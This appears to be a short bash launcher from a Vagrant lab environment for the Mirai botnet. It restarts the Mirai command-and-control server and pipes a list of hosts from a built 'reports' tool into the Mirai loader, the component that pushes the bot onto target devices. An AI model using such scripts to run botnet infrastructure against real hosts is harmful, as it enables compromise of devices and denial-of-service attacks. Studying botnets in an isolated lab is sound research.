#!/usr/bin/env bash

echo ">>> Starting cnc..."
killall cnc || true
duende /vagrant/mirai/release/cnc

echo ">>> Startig loader..."
cd /vagrant/mirai/loader
/vagrant/mirai/reports/build.sh 
./reports /vagrant/configs/hosts.txt | ./loader
